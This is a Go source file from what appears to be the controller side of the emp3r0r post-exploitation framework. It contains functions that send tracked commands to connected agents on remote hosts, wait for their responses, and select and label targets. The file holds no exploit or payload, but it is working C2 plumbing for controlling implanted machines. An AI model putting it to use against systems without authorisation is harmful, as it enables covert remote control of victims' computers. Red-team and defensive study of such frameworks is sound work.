package cc

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/cavaliergopher/grab/v3"
	"github.com/google/uuid"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// DownloadFile download file using default http client
func DownloadFile(url, path string) (err error) {
	LogDebug("Downloading '%s' to '%s'", url, path)
	_, err = grab.Get(path, url)
	return
}

// SendCmd send command to agent
func SendCmd(cmd, cmd_id string, a *emp3r0r_def.Emp3r0rAgent) error {
	if a == nil {
		return errors.New("SendCmd: agent not found")
	}

	var cmdData emp3r0r_def.MsgTunData

	// add UUID to each command for tracking
	if cmd_id == "" {
		cmd_id = uuid.New().String()
	}

	// parse command
	cmdSlice := util.ParseCmd(cmd)
	cmdData.CmdSlice = cmdSlice
	cmdData.Tag = a.Tag
	cmdData.CmdID = cmd_id

	// timestamp
	cmdData.Time = time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST")
	CmdTimeMutex.Lock()
	CmdTime[cmd_id] = cmdData.Time
	CmdTimeMutex.Unlock()

	if !strings.HasPrefix(cmd, "!") {
		go wait_for_cmd_response(cmd, cmd_id, a)
	}

	return Send2Agent(&cmdData, a)
}

func wait_for_cmd_response(cmd, cmd_id string, agent *emp3r0r_def.Emp3r0rAgent) {
	ctrl, exists := Targets[agent]
	if !exists || agent == nil {
		LogWarning("SendCmd: agent '%s' not connected", agent.Tag)
		return
	}
	now := time.Now()
	for ctrl.Ctx.Err() == nil {
		if resp, exists := CmdResults[cmd_id]; exists {
			LogDebug("Got response for %s from %s: %s", strconv.Quote(cmd), strconv.Quote(agent.Name), resp)
			return
		}
		wait_time := time.Since(now)
		if wait_time > 90*time.Second && !waitNeeded(cmd) {
			LogWarning("Executing %s on %s: unresponsive for %v",
				strconv.Quote(cmd),
				strconv.Quote(agent.Name),
				wait_time)
			return
		}
		util.TakeABlink()
	}
}

func waitNeeded(cmd string) bool {
	return strings.HasPrefix(cmd, "!") || strings.HasPrefix(cmd, "get") || strings.HasPrefix(cmd, "put ")
}

// SendCmdToCurrentTarget send a command to currently selected agent
func SendCmdToCurrentTarget(cmd, cmd_id string) error {
	// target
	target := ValidateActiveTarget()
	if target == nil {
		return fmt.Errorf("you have to select a target first")
	}

	// send cmd
	return SendCmd(cmd, cmd_id, target)
}

// get available terminal emulator on current system
func getTerminalEmulator() (res string) {
	terms := []string{"gnome-terminal", "xfce4-terminal", "xterm"}
	for _, term := range terms {
		if util.IsCommandExist(term) {
			res = term
			break
		}
	}
	return
}

// OpenInNewTerminalWindow run a command in new terminal emulator window
func OpenInNewTerminalWindow(name, cmd string) error {
	terminal := getTerminalEmulator()
	if terminal == "" {
		return fmt.Errorf("no available terminal emulator")
	}

	// works fine for gnome-terminal and xfce4-terminal
	job := fmt.Sprintf("%s -t '%s' -e '%s || read'", terminal, name, cmd)

	out, err := exec.Command("/bin/bash", "-c", job).CombinedOutput()
	if err != nil {
		return fmt.Errorf("%v: %s", err, out)
	}

	return nil
}

// GetDateTime get current date and time, for logging
func GetDateTime() (datetime string) {
	now := time.Now()
	datetime = now.String()

	return
}

// IsCCRunning check if CC is already running
func IsCCRunning() bool {
	// it is running if we can connect to it
	return tun.IsPortOpen("127.0.0.1", RuntimeConfig.CCPort)
}

// UnlockDownloads if there are incomplete file downloads that are "locked", unlock them
// unless CC is actually running/downloading
func UnlockDownloads() error {
	// unlock downloads
	files, err := os.ReadDir(FileGetDir)
	if err != nil {
		return err
	}
	for _, f := range files {
		if strings.HasSuffix(f.Name(), ".lock") {
			err = os.Remove(FileGetDir + f.Name())
			LogDebug("Unlocking download: %s", f.Name())
			if err != nil {
				return fmt.Errorf("remove %s: %v", f.Name(), err)
			}
		}
	}

	return nil
}

// CopyToClipboard copy data to clipboard using xsel -b
func CopyToClipboard(data []byte) {
	exe := "xsel"
	cmd := exec.Command("xsel", "-bi")
	if os.Getenv("WAYLAND_DISPLAY") != "" {
		exe = "wl-copy"
		cmd = exec.Command("wl-copy")
	} else if os.Getenv("DISPLAY") == "" {
		LogWarning("Neither Wayland nor X11 is running, CopyToClipboard will abort")
		return
	}
	if !util.IsCommandExist(exe) {
		LogWarning("%s not installed", exe)
		return
	}
	stdin, stdinErr := cmd.StdinPipe()
	if stdinErr != nil {
		LogWarning("CopyToClipboard read stdin: %v", stdinErr)
		return
	}
	go func() {
		defer stdin.Close()
		_, _ = stdin.Write(data)
	}()

	stdinErr = cmd.Run()
	if stdinErr != nil {
		LogWarning("CopyToClipboard: %v", stdinErr)
	}
	LogInfo("Copied to clipboard")
}

func setTargetLabel(cmd *cobra.Command, args []string) {
	label, err := cmd.Flags().GetString("label")
	if err != nil {
		LogError("set target label: %v", err)
		return
	}
	agent_id, err := cmd.Flags().GetString("id")
	if err != nil {
		LogError("set target label: %v", err)
		return
	}

	if agent_id == "" || label == "" {
		LogError(cmd.UsageString())
		return
	}

	target := new(emp3r0r_def.Emp3r0rAgent)

	// select by tag or index
	index, e := strconv.Atoi(agent_id)
	if e != nil {
		// try by tag
		target = GetTargetFromTag(agent_id)
		if target == nil {
			// cannot parse
			LogError("Cannot set target label by index: %v", e)
			return
		}
	} else {
		// try by index
		target = GetTargetFromIndex(index)
	}

	// target exists?
	if target == nil {
		LogError("Failed to label agent: target does not exist")
		return
	}
	Targets[target].Label = label // set label
	labelAgents()
	LogSuccess("%s has been labeled as %s", target.Tag, label)
	ListTargets() // update agent list
}
